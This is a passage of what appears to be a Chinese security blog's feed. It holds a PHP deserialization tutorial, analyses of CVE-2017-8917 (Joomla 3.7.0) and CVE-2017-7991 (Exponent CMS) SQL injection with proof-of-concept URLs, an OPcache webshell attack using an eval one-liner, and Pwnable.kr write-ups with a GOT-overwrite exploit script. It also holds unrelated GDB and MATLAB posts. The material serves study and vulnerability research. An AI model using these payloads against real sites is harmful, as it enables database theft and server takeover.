的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。 利用构造函数等Magic functionphp中有一类特殊的方法叫“Magic function”， 这里我们着重关注一下几个： 构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。 析构函数__destruct()：当对象被销毁时会自动调用。 __wakeup() ：如前所提，unserialize()时会自动调用。 测试如下：12345678910111213141516171819202122232425&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; echo "__wakeup"; echo "&lt;/br&gt;"; &#125; function __construct()&#123; echo "__construct"; echo "&lt;/br&gt;"; &#125; function __destruct()&#123; echo "__destruct"; echo "&lt;/br&gt;"; &#125;&#125;$class2 = 'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'; print_r($class2);echo "&lt;/br&gt;";$class2_unser = unserialize($class2);print_r($class2_unser);echo "&lt;/br&gt;";?&gt; 利用场景__wakeup() 或__destruct()由前可以看到，unserialize()后会导致__wakeup() 或__destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在__wakeup() 或__destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。这里针对 __wakeup() 场景做个实验。假设index源码如下：123456789101112131415161718&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class3 = $_GET['test'];print_r($class3);echo "&lt;/br&gt;";$class3_unser = unserialize($class3);require "shell.php";// 为显示效果，把这个shell.php包含进来?&gt; 同目录下有个空的shell.php文件。一开始访问index.php。 基本的思路是，本地搭建好环境，通过 serialize() 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 “&lt;?php phpinfo(); ?&gt;”,再调用unserialize()时会通过__wakeup()把test的写入到shell.php中。为此我们写个php脚本：123456789101112&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class4 = new chybeta();$class4-&gt;test = "&lt;?php phpinfo(); ?&gt;"; $class4_ser = serialize($class4); print_r($class4_ser);?&gt; 由此得到序列化结果：1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;&#125; 其他Magic function的利用但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的__construct()，是不是就没有利用价值呢？非也。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。123456789101112131415161718192021222324&lt;?phpclass ph0en1x&#123; function __construct($test)&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$test); fclose($fp); &#125;&#125;class chybeta&#123; var $test = '123'; function __wakeup()&#123; $obj = new ph0en1x($this-&gt;test); &#125;&#125;$class5 = $_GET['test'];print_r($class5);echo "&lt;/br&gt;";$class5_unser = unserialize($class5);require "shell.php";?&gt; 这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 __wakeup()函数，从而在new ph0en1x()会自动调用对象ph0en1x中的__construct()方法，从而把&lt;?php phpinfo() ?&gt;写入到 shell.php中。 利用普通成员方法前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。12345678910111213141516171819202122232425262728293031&lt;?phpclass chybeta &#123; var $test; function __construct() &#123; $this-&gt;test = new ph0en1x(); &#125; function __destruct() &#123; $this-&gt;test-&gt;action(); &#125;&#125;class ph0en1x &#123; function action() &#123; echo "ph0en1x"; &#125;&#125;class ph0en2x &#123; var $test2; function action() &#123; eval($this-&gt;test2); &#125;&#125;$class6 = new chybeta();unserialize($_GET['test']);?&gt; 本意上，new一个新的chybeta对象后，调用__construct()，其中又new了ph0en1x对象。在结束后会调用__destruct()，其中会调用action()，从而输出 ph0en1x。 下面是利用过程。构造序列化。123456789101112131415&lt;?phpclass chybeta &#123; var $test; function __construct() &#123; $this-&gt;test = new ph0en2x(); &#125;&#125;class ph0en2x &#123; var $test2 = &quot;phpinfo();&quot;;&#125;echo serialize(new chybeta());?&gt; 得到：1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;O:7:&quot;ph0en2x&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; 传给index.php的test参数，利用成功：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析]]></title>
      <url>%2F2017%2F05%2F19%2FCVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[Joomla!3.7.0 Core SQL注入漏洞. POC这次干脆先放出poc吧。12345http://localhost:2500/Joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,database()),0) 这次根据参数的传入流程来进行分析。 漏洞危害组件3.7.0版本中出现了com_field组件,无需授权即可访问。查看...\components\com_fields\controller.php，在第27行左右，其相关代码如下：12345678910111213141516public function __construct($config = array()) &#123; $this-&gt;input = JFactory::getApplication()-&gt;input; // Frontpage Editor Fields Button proxying: if ($this-&gt;input-&gt;get('view') === 'fields' &amp;&amp; $this-&gt;input-&gt;get('layout') === 'modal') &#123; // Load the backend language file. $lang = JFactory::getLanguage(); $lang-&gt;load('com_fields', JPATH_ADMINISTRATOR); $config['base_path'] = JPATH_COMPONENT_ADMINISTRATOR; &#125; parent::__construct($config); &#125; 可以看到它先判断通过view是否等于fields,layout是否等于modal,而这两个参数都是我们可控的。若满足则将会加载JPATH_ADMINISTRATOR中的com_fields组件，并且将base_path设置为 JPATH_COMPONENT_ADMINISTRATOR，之后调用父类的构造方法。 传入sql语句在调用父类构造方法后，一路运行到...\Joomla370\libraries\legacy\controller\legacy.php中，约莫707行，这时会通过$this-&gt;$doTask调用display()函数。 跟进display()函数，它位于 ...\Joomla370\libraries\legacy\controller\legacy.php，接着运行至legacy.php的约莫671行左右，调用了视图（view）的display()函数。我们跟进一下，跳转进入...\Joomla370\administrator\components\com_fields\views\fields\view.html.php， 此时运行到，下面这条语句，给get()传入的参数为State 1$this-&gt;state = $this-&gt;get('State'); 我们跟进这个get()函数，一直运行到422行， 之后将会调用 getState()，跟进，进入...\Joomla370\libraries\legacy\model\legacy.php 之后会调用filedsModel类中的populateState()，跟进后会发现调用其父类的populateState()函数，其定义在 ...\Joomla370\libraries\legacy\model\list.php中，约莫在第495行，相关代码如下：12345..省略..if ($list = $app-&gt;getUserStateFromRequest($this-&gt;context . '.list', 'list', array(), 'array'))..省略.. 这里我们先跟进一下getUserStateFromRequest()，它的定义在...\Joomla370\libraries\cms\application\cms.php中，在该函数结束后，它获取了我们通过get方法传入的参数，也就是说，我们成功的控制了fullordering的值。 在该函数运行完后，流程将会回到前面的那个定义在...\Joomla370\libraries\cms\application\cms.php中的populateState()函数。此时运行的代码如下：12345678910foreach ($list as $name =&gt; $value)&#123; // Exclude if blacklisted if (!in_array($name, $this-&gt;listBlacklist)) &#123; // Extra validations switch ($name)&#123;...&#125; $this-&gt;setState('list.' . $name, $value); &#125;&#125; 如果数组的key不在黑名单（blacklisted）中，将会为$list变量根据相应的State进行注册，在这部分函数运行到结束部分，可以看见成功的控制了list数组的fullordering的值。 查看变量，如下： 注入过程接下来继续运行，一直运行回到Joomla370\administrator\components\com_fields\views\fields\view.html.php中的display()函数中。 跟进这一行 $this-&gt;get(&#39;Items&#39;);，进入...\Joomla370\libraries\legacy\view\legacy.php，约莫在422行,这里的行为跟前面分析类似，此后将会调用getitem()： 继续跟进，进入...\Joomla370\libraries\legacy\model\list.php，约莫在186行：12345try &#123; // Load the list items and add the items to the internal cache. $this-&gt;cache[$store] = $this-&gt;_getList($this-&gt;_getListQuery(), $this-&gt;getStart(), $this-&gt;getState('list.limit')); &#125; 通过_getList调用了_getListQuery,继续跟进，进入...\Joomla370\libraries\legacy\model\list.php，约莫在 132行，12345if ($lastStoreId != $currentStoreId || empty($this-&gt;query))&#123; $lastStoreId = $currentStoreId; $this-&gt;query = $this-&gt;getListQuery();&#125; 调用了 getListQuery()，继续跟进，进入 ...\Joomla370\administrator\components\com_fields\models\fields.php,一直运行到约莫在 305 行，调用getState方法，传入list.fullordering参数。相关代码如下： 查看变量表： 之后在第314行，将$listOrdering带入查询，相关代码如下：1$query-&gt;order($db-&gt;escape($listOrdering) . ' ' . $db-&gt;escape($orderDirn)); 在进行$query-&gt;order之前，会先进行一次过滤，跟进$db-&gt;escape，进入...\Joomla370\libraries\joomla\database\driver\mysqli.php，约莫242行，相关代码如下：12345678910111213public function escape($text, $extra = false) &#123; $this-&gt;connect(); $result = mysqli_real_escape_string($this-&gt;getConnection(), $text); if ($extra) &#123; $result = addcslashes($result, '%_'); &#125; return $result; &#125; 对于传入的$text通过mysqli_real_escape_string()进行过滤，只转义了一些字符。因此可以通过构造进行成功的注入。 成功注入]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[一次水水的调试]]></title>
      <url>%2F2017%2F05%2F16%2F%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84GDB%E8%B0%83%E8%AF%95%2F</url>
      <content type="text"><![CDATA[Linux 作业… 编译1gcc -g -O0 array.c main.c -o test 调试1gdb test 通过list命令，可以显示出部分源代码，我们选择在源代码的第9行处下断点。 通过print命令，可以查看变量的值，因为数组名已知，可以如下打印出数组的内容。可以发现，在还没有初始化或者赋值前，数组内容是随机化（或者说是垃圾数据）。 此时程序运行到第9行附近，可以再次通过list命令显示其附近的源代码。 这里为了方便，我们在第11，12，15行下下断点，分别对应两个array_fill_with() 函数 和 array_add()函数。 接下来单步调试，命令是 1gdb-peda$ n 此时在执行完第11行的array_fill_with(),即已经完成了对数组vector_a的赋值后，我们查看下三个数组的值。 数组vector_a全被赋值为10在意料之中（0xa == 10 ），但注意数组vector_b的第一个元素也被赋值为0xa了。在前面可知，数组vector_b的第一个元素原本是0xff00。所以这边可能产生了一个越界。 下一条语句是对数组vector_b进行赋值，这次我们选择进入函数array_fill_with()，即进行step into，gdb中相应的命令为：1gdb-peda$ s 由上图，通过list命令，可知我们已经进入到了array.c中的第七行，正在进行一个循环。其中变量length的值为0x10，即为16。 我们知道，在C语言中，数组下标是从0开始的，这里也就解释了为什么我们再对数组vector_a赋值完后，数组vector_b的第一个元素也被改变了。 接下来我们继续运行程序，命令为：1gdb-peda$ c 此时，已经完成了对数组vector_b的赋值，我们可以推测数组vector_c的第一个元素也会被从原先的 0x0 改为 0x37。事实证明，推测是正确的，见下图： Bug其实重点就一个，C语言中数组下标从0开始的。把array.c中的i &lt;= length 改为 i &lt; length就ok啦。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[利用PHP的OPcache机制getshell]]></title>
      <url>%2F2017%2F05%2F13%2F%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell%2F</url>
      <content type="text"><![CDATA[OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。本文是对 《binary-webshell-through-opcache-in-php-7》一文的测试。 关于OPcache在我们指定了一个缓存目录（后面提到）后，php会把编译好的php字节码文件放到这个缓存目录中。这里假设该缓存目录是/var/www/html/opcache，未访问前，opcache文件夹为空。接下去我去访问 index.php后，php会在 opcache文件夹中创建一个名为md5哈希值的文件夹，其下的目录结构和 index.php所在目录结构相同，同时生成了 index.php.bin。 这个index.php.bin 就是 index.php 的缓存文件。并且作为www-data用户，我们对 5672f68788bcb25b11403b33f5d1497f 具有读写执行权限。这样，我们想办法把这个index.php.bin替换为包含有恶意代码的index.php.bin文件，当我们再次去访问index.php时，php会选择加载这个缓存文件，从而我们达到了getshell的目的。这个思路，感觉跟二进制漏洞中的GOT覆写技术有点神似吧。 环境配置php版本12345root@4db5ba2ab3bf:/var/www/html# php -vPHP 7.0.15-0ubuntu0.16.04.4 (cli) ( NTS )Copyright (c) 1997-2017 The PHP GroupZend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies with Zend OPcache v7.0.15-0ubuntu0.16.04.4, Copyright (c) 1999-2017, by Zend Technologies 配置OPcache开启OPcache在php配置文件 php.ini 的约莫 1745 行左右，找到如下配置：1;opcache.enable=0 去掉前面的分号;，将0改为1，如下：1opcache.enable=1 关闭时间戳验证1;opcache.validate_timestamps=1 修改为1opcache.validate_timestamps=0 设置OPcache缓存路径继续向下翻，找到如下配置：1;opcache.file_cache= 这里我修改后的配置是：1opcache.file_cache= &quot;/var/www/html/opcache&quot; 设置缓存文件优先级1;opcache.file_cache_only=0 修改为1opcache.file_cache_only=1 重启apache这里我以apache作为web服务器。1service apache2 resart 重启，使前面修改的php.ini生效 www目录index.php12345678910111213&lt;html&gt; &lt;body&gt; &lt;form action="upload-file.php" method="post" enctype="multipart/form-data"&gt; &lt;label for="file"&gt;filename:&lt;/label&gt; &lt;input type="file" name="file" id="file" /&gt; &lt;br/&gt; &lt;label for="filepath"&gt;filepath:&lt;/label&gt; &lt;input type="text" name="filepath" id="filepath" /&gt; &lt;br/&gt; &lt;input type="submit" name="submit" value="submit" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; upload-file.php12345678&lt;?php $path = $_POST['filepath']; echo "filename: " . $_FILES["file"]["name"] . "&lt;br /&gt;"; echo "type: " . $_FILES["file"]["type"] . "&lt;br /&gt;"; echo "size: " . ($_FILES["file"]["size"] / 1024) . " Kb&lt;br /&gt;"; move_uploaded_file($_FILES["file"]["tmp_name"], $path . $_FILES["file"]["name"]); echo "save : " . $path . $_FILES["file"]["name"]; ?&gt; 那个。。代码写得很丑。。仅为测试之用：） phpinfo.php123&lt;?php phpinfo();?&gt; getshell现在开始黑盒测试。。 利用phpinfo获取信息 可知，OPcache缓存路径在 /var/www/html/opcache 中。且服务器端开启了 opcache.file_cache_only,禁用了opcache.validate_timestamps。 这是能成功利用的条件。 php7-opcache-override.py由前可知，在对缓存文件进行操作前，需要经过一个名称是md5哈希值的文件夹。这可以通过 hp7-opcache-override.py 来计算。 得到这个文件夹名为：5672f68788bcb25b11403b33f5d1497f 构建恶意的缓存文件恶意的缓存文件得先本地生成，然后通过各种方式比如上传等去覆盖服务器上的缓存文件。我们先在本地配置好OPcache，这样才能生成缓存文件。然后本地新建一个 index.php,内容是一句话木马&lt;?php @eval($_POST[test]);?&gt;，之后访问它。在对应的缓存文件夹里可以看到index.php.bin用十六进制编辑器打开，将OPCACHE.后的那串md5哈希值，替换为前一步骤得到的哈希值：5672f68788bcb25b11403b33f5d1497f ,修改后如下： 覆盖原缓存文件在覆盖之前，先看看服务器上的原缓存文件长啥样： 这里利用上传来进行覆盖。访问index.php,选择修改后的index.php.bin进行上传，上传路径为要覆盖的缓存文件的相对地址 opcache/5672f68788bcb25b11403b33f5d1497f/var/www/html/。 上传完成后，服务器上的缓存文件已经替换成我们构造的恶意文件了。 菜刀连上此时再去访问 index.php,发现已经被修改了，不再是上传的页面。用菜刀连上，密码是 test 。成功getshell。 CTF前面我们是通过上传来实现覆盖，但实际利用起来肯定没那么简单。利用OPcache来获得webshell的姿势一般都会和其他姿势相结合。比如下面两题CTF题 ASIS CTF 2016 – BinaryCloud这题是通过上传来覆盖，但后端有各种过滤。附上writeup ALICTF 2016 - homework这题利用sql注入的dumpfile来实现对缓存文件的覆盖。附上writeup （Author:chybeta）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析]]></title>
      <url>%2F2017%2F05%2F12%2FCVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[Exponent CMS是一款开源的CMS，其2.4.1版中存在sql注入 漏洞注入点在 /framework/modules/eaas/controllers/eaasController.php 中。如下： 12345678910111213141516171819202122public function api() &#123; if (empty($this-&gt;params['apikey'])) &#123; $_REQUEST['apikey'] = true; // set this to force an ajax reply $ar = new expAjaxReply(550, 'Permission Denied', 'You need an API key in order to access Exponent as a Service', null); $ar-&gt;send(); //FIXME this doesn't seem to work correctly in this scenario &#125; else &#123; $key = expUnserialize(base64_decode(urldecode($this-&gt;params['apikey']))); $cfg = new expConfig($key); $this-&gt;config = $cfg-&gt;config; if(empty($cfg-&gt;id)) &#123; $ar = new expAjaxReply(550, 'Permission Denied', 'Incorrect API key or Exponent as a Service module configuration missing', null); $ar-&gt;send(); &#125; else &#123; if (!empty($this-&gt;params['get'])) &#123; $this-&gt;handleRequest(); &#125; else &#123; $ar = new expAjaxReply(200, 'ok', 'Your API key is working, no data requested', null); $ar-&gt;send(); &#125; &#125; &#125;&#125; api()中，先检测参数apikey 是否为空，若不为空，则进入else分支。在分支中，先对参数apikey进行一次urldecode,接着进行 base64_decode,最后进行一次反序列化expUnserialize，在expUnserialize中存在一次小小的过滤：1234567891011121314function expUnserialize($serial_str) &#123; if ($serial_str === 'Array') return null; // empty array string?? if (is_array($serial_str) || is_object($serial_str)) return $serial_str; // already unserialized// $out1 = @preg_replace('!s:(\d+):"(.*?)";!se', "'s:'.strlen('$2').':\"$2\";'", $serial_str ); $out = preg_replace_callback( '!s:(\d+):"(.*?)";!s', create_function ('$m', '$m_new = str_replace(\'"\',\'\"\',$m[2]); return "s:".strlen($m_new).\':"\'.$m_new.\'";\';' ), $serial_str );// if ($out1 !== $out) &#123;// eDebug('problem:&lt;br&gt;'.$out.'&lt;br&gt;'.$out1);// &#125; 它会把 经过base64_decode后的$apikey 中的双引号加上斜杠。但是对于单引号，它没有进行处理。在进行expUnserialize之后，赋值给$key，并在之后实例化一个 expConfig对象。expConfig部分代码如下： 12345678910111213class expConfig extends expRecord &#123; protected $table = 'expConfigs'; function __construct($params=null) &#123; global $db; if (!is_array($params)) &#123; $this-&gt;location_data = serialize($params); parent::__construct($db-&gt;selectValue($this-&gt;table, 'id', "location_data='".$this-&gt;location_data."'")); &#125; else &#123; parent::__construct($params); &#125; .... 在 framysqli\core\subsystems\database\mysqli.php 中，可以看到关于selectValue的定义： 123456789101112131415function selectValue($table, $col, $where=null) &#123; if ($where == null) $where = "1"; $sql = "SELECT " . $col . " FROM `" . $this-&gt;prefix . "$table` WHERE $where LIMIT 0,1"; $res = @mysqli_query($this-&gt;connection, $sql); if ($res == null) return null; $obj = mysqli_fetch_object($res); if (is_object($obj)) &#123; return $obj-&gt;$col; &#125; else &#123; return null; &#125;&#125; 可以看到，在检查完$params是否是数组后，将我们传入的$params序列化后直接插入到了数据库查询语句中,未作任何过滤和检测。加上之前并未对单引号进行处理，因此我们可以利用单引号，对 location_data=&#39;&quot;.$this-&gt;location_data.&quot;&#39; 中的单引号进行闭合。 POC1234http://localhost:2500/exponent241/index.php?module=eaas&amp;action=api&amp;apikey=czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7 其中 base64_decode(“czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7”) = s:16:”aaa’or “‘sleep(2)# 查看 mysql.log ，可以发现成功注入。运行的 sql语句 为： 1SELECT id FROM `exponent_expConfigs` WHERE location_data=&apos;s:19:&quot;aaa&apos;or \&quot;&apos;sleep(2)#&quot;;&apos; LIMIT 0,1 可以看到单引号被成功闭合。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[三次样条插值之MATLAB实现]]></title>
      <url>%2F2017%2F04%2F09%2F%E4%B8%89%E6%AC%A1%E6%A0%B7%E6%9D%A1%E6%8F%92%E5%80%BC%E4%B9%8BMATLAB%E5%AE%9E%E7%8E%B0%2F</url>
      <content type="text"><![CDATA[三次样条插值之MATLAB实现 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475clear allx = input('输入横坐标，格式:[x1 x2 …… xn]\n')y = input('输入纵坐标，格式:[y1 y2 …… yn]\n')n = length(x);flag = input('请选择边界条件：①已知两端一阶导数值，②已知两端二阶导数值。选择 1 or 2 :');if flag == 1 y1_deri = input('x1 的 一阶导数值：'); yn_deri = input('xn 的 一阶导数值：');else y1_deri = input('x1 的 二阶导数值：'); yn_deri = input('xn 的 二阶导数值：');endfor i = 1 : n-1 h(i) = x(i+1) - x(i);endfprintf('计算 h 结果为:\n');hfor i = 2 : n-1 u(i-1) = h(i-1) / (h(i-1) + h(i)); lamda(i) = h(i) / (h(i-1) + h(i));endif flag == 1 u(n-1) = 1; lamda(1) = 1;else u(n-1) = 0; lamda(1) = 0;endfprintf('计算 μ 结果为: \n');ufprintf('计算 λ 结果为：\n');lamdafor i = 2 : n-1 d(i) = 6 * ((y(i+1)-y(i))/(x(i+1)-x(i)) - (y(i) - y(i-1))/( x(i) - x(i-1)))/(h(i-1)+h(i));endif flag == 1 d(1) = 6 / h(1) * (( y(2)-y(1) )/( x(2) - x(1) ) - y1_deri); d(n) = 6 / h(n-1) * (yn_deri - ((y(n) - y(n-1)) / ( x(n) - x(n-1))));else d(1) = 2 * y1_deri; d(n) = 2 * yn_deri;endfprintf('计算 d 的结果：\n');dmatrix1 = zeros(n,n);for i = 1 : n-1 matrix1(i,i) = 2; matrix1(i,i+1) = lamda(i); matrix1(i+1,i) = u(i);endmatrix1(n,n) = 2;matrix1;fprintf('求得 M 结果:\n');M = matrix1\d'for i = 1 : n-1 clear S syms t k = x(i):0.001:x(i+1); fprintf('区间为[ %.3f : %.3f]\n',x(i),x(i+1)); S = M(i)*(x(i+1)-t)^3/ (6*h(i)) + M(i+1)*(t - x(i))^3/(6*h(i))+(y(i) - M(i)*h(i)^2/6)*(x(i+1) - t)/h(i) + (y(i+1) - M(i+1)*h(i)^2/6)*(t - x(i))/h(i) s = M(i)*(x(i+1)-k).^3/ (6*h(i)) + M(i+1)*(k - x(i)).^3/(6*h(i))+(y(i) - M(i)*h(i)^2/6)*(x(i+1) - k)/h(i) + (y(i+1) - M(i+1)*h(i)^2/6)*(k - x(i))/h(i); hold on; plot(k,s);end Result测试例题：《计算方法》（李庆扬版）P44 例71234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&gt;&gt; sanciyangtiao输入横坐标，格式:[x1 x2 …… xn][27.7 28 29 30]x = 27.7000 28.0000 29.0000 30.0000输入纵坐标，格式:[y1 y2 …… yn][4.1 4.3 4.1 3.0]y = 4.1000 4.3000 4.1000 3.0000请选择边界条件：①已知两端一阶导数值，②已知两端二阶导数值。选择 1 or 2 :1x1 的 一阶导数值：3.0xn 的 一阶导数值：-4.0计算 h 结果为:h = 0.3000 1.0000 1.0000计算 μ 结果为:u = 0.2308 0.5000 1.0000计算 λ 结果为：lamda = 1.0000 0.7692 0.5000计算 d 的结果：d = -46.6667 -4.0000 -2.7000 -17.4000求得 M 结果:M = -23.5314 0.3960 0.8297 -9.1149区间为[ 27.700 : 28.000]S =(35650*(t - 28)^3)/2727 - (107*t)/202 + (200*(t - 277/10)^3)/909 + 19317/1010区间为[ 28.000 : 29.000]S =(419*(t - 28)^3)/3030 - (55*t)/202 - (20*(t - 29)^3)/303 + 35929/3030区间为[ 29.000 : 30.000]S =(563*t)/1010 - (4603*(t - 29)^3)/3030 - (419*(t - 30)^3)/3030 - 36977/3030]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:random]]></title>
      <url>%2F2017%2F04%2F09%2FPwnable-kr-random%2F</url>
      <content type="text"><![CDATA[伪随机 random先file看一下 IDA打开 可以看到程序读入 v4 ，跟 v5 进行异或操作，若结果为 0xDEADBEEF ，则可以读取到flag。其中 v5的初始值由 rand（）指定。 rand（）rand（）产生伪随机数。伪随机数的“随机”之处是它的种子（seed）。种子确定后，按照一定算法所计算出来的随机数序列也就完全确定了。 C语言中，可以通过 srand() 来指定种子（seed）。如果用户在调用 rand（）之前没有调用过 srand（），则系统默认种子为 1 。测试如下： 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char const *argv[])&#123; unsigned int random1; random1 = rand(); printf("No srand():\n"); printf("random1 = %u\n", random1); unsigned int random2; srand(1); random2 = rand(); printf("srand(1):\n"); printf("random2 = %u\n", random2); unsigned int random3; srand(2); random3 = rand(); printf("srand(2):\n"); printf("random3 = %u\n", random3); return 0;&#125; Exp由以上分析可知，v5的值其实是确定的，为 1804289383。而判断条件(v5 ^ v4) == 0xDEADBEEF 等价于 v4 == 0xDEADBEEF ^ v5 。运算可得 1804289383 ^ 0xDEADBEEF = 3039230856。所以我们要给 v4 传入 3039230856 。 1234random@ubuntu:~$ ./random3039230856 Good!Mommy, I thought libc random is unpredictable... FLAG: Mommy, I thought libc random is unpredictable…]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:passcode]]></title>
      <url>%2F2017%2F04%2F08%2FPwnable-kr-passcode%2F</url>
      <content type="text"><![CDATA[简单GOT覆写 passcodemain先file看一下，32位。 用IDA打开，f5 可以看到，在调用完 welcome() 后立即调用了 login()。也就是说，welcome()栈帧的栈底 和 login()栈帧的栈底 是一样的。 welcome（） 通过 __isoc99_scanf() 读取name字符串，字符串大小为100。且由1int v1; // [sp+18h] [bp-10h]@0 这一行可知，在 welcome() 的栈帧中，name字符串的起始位置在 ebp-70h 的地方。 login（） 这里分别通过1__isoc99_scanf(&quot;%d&quot;) 来获得 passcode1 和 passcode2 的值。要注意的是，这里 scanf(“%d”) 中没有出现取地址符，也就是说，scanf(“%d”) 会直接把栈上的数据当作指针，并将读入的数据存放到这个“指针”指的“地址”上。 以第一个红框为例，它对应着 passcode1 的读入。scanf的参数有两个，第一个是格式化字符串，第二个是地址表列。按照参数从右到左入栈。所以下面这段话，将 ebp-0x10 处的数据 放到了 esp+0x4 处 作为了 scanf的地址表项参数12804857c: 8b 55 f0 mov edx,DWORD PTR [ebp-0x10]804857f: 89 54 24 04 mov DWORD PTR [esp+0x4],edx scanf的第一个参数即 格式化字符串 由下面这两句话传入1238048577: b8 83 87 04 08 mov eax,0x8048783省略8048583: 89 04 24 mov DWORD PTR [esp],eax 0x8048783 处的数据如下：所以对于第一个 scanf(), 它的第二个参数的数值为在login（）栈帧的 ebp-0x10 处的数据。 对于passcode2 的分析同理。 CheckAnalysis从login（）的逻辑来看，只要 v1 = 0x528E6 和 0xCC07C9 程序就能执行到 return system（）。而且 welcome（）和 login（） 的 ebp 是相同的，有没有可能通过构造 welcome的输入 来控制 v1 v2 的值呢？ 从前边的ida分析来看，在login（）的栈帧中，passcode1位置在 ebp-10h, 在welcome（）栈帧中，name字符串起始位置在 ebp-70h。由于welcome（）和login（）调用连续，他们的栈帧的ebp其实是一样的。如下图，两个栈帧对比如下： 70h - 10h = 60h = 96 &lt; 100。也就是说，我们在welcome（）中输入的name的第 97 - 100 的字符，在 login（）栈帧中恰好是作为第一个 scanf 的第二个参数（即地址表项）。而在login（）中，调用第一次 scanf 时传入的 %d 将会写到这个地址中。这样我们能控制 passcode1。 用peda的checksec检查发现开启了canary保护 由于passcode1已经是在长度为100的name的最后四个字节，因此不可能通过继续增加name的输入来控制 passcode2，否则会触发canary。 科普：GOTlinux中，ELF编译系统采用了一种叫延迟绑定（lazy binding）的技术。若ELF文件调用了定义在共享库中的函数，那ELF文件中就存在 GOT（全局偏移表） 和 PLT（过程链接表），其中GOT存放在 .data 段（已初始化的全局C变量），而PLT存放在 .text 段（已编译程序的机器代码）。对于一般函数，PLT表和GOT表一一对应。 当第一次调用共享库中的函数时，该函数对应的GOT表项中存放的是对应PLT表中的push1条目的地址。程序调用时，执行函数对应PLT的第一条指令时会先通过对应GOT跳转到PLT表中的下一条指令，之后通过一系列操作，将对应GOT覆盖为函数的真实地址，并执行该函数。等到下一次调用该函数时，程序一样先执行函数对应PLT的第一条指令，之后通过GOT表会直接执行该函数，因为GOT表中已经是函数的真实地址了。 Thinking通过之前的分析，我们能通过控制name的最后四个字节，结合passcode1的scanf来实现对任意地址的写入。加上 GOT表是在 .data 段，是可写的。因此一个想法就是：我们可以将 printf 的GOT表 覆写为 system函数的地址。由前可知，当再次调用 printf 时，会通过 printf的GOT表执行 system函数。 printf 的 GOT地址可以通过 pwntools 工具获得。也可以通过 objdump 获得，如下. 对于system函数地址，由于程序中已经提供了，所以这里直接取 80485e3 这里对应着login（）中的1return system(&quot;/bin/cat flag&quot;); 梳理一下思路：按照程序的流程，welcome（），我们输入100个字符，其中最后四个是 printf的GOT地址。之后程序进入login，调用scanf（”%d”）时，以 %d 形式将我们输入的数据（ system(“/bin/cat flag”)）读入，并写入到 printf的GOT地址。接下去，程序会执行 printf(“enter passcode2 : “); 即再次调用printf函数，但实际执行的是 system函数。要注意的是，由于是以 %d 形式读入，所以输入时应为 134514147 （0x80485e3 = 134514147） Exp12345678910111213141516171819from pwn import *elf = ELF("passcode")r = remote("127.0.0.1","12345")#r = process("./passcode")printfGotAddr = elf.got["printf"]systemAddr = 134514147print "the printfGotAddr is "+ hex(printfGotAddr)print "the systemAddr is "+ hex(systemAddr)payload1 = 'a' * 96 + p32(printfGotAddr)payload2 = str(systemAddr)r.sendline(payload1)r.sendline(payload2)print r.recv() flaglocal test123456789101112(venv) chybeta@ubuntu:~/pwn/pwnable/passcode$ python exp.py[*] &apos;/home/chybeta/pwn/pwnable/passcode/passcode&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE[+] Opening connection to 127.0.0.1 on port 12345: Donethe printfGotAddr is 0x804a000the systemAddr is 0x80485e3flag&#123;2222222222&#125;[*] Closed connection to 127.0.0.1 port 12345 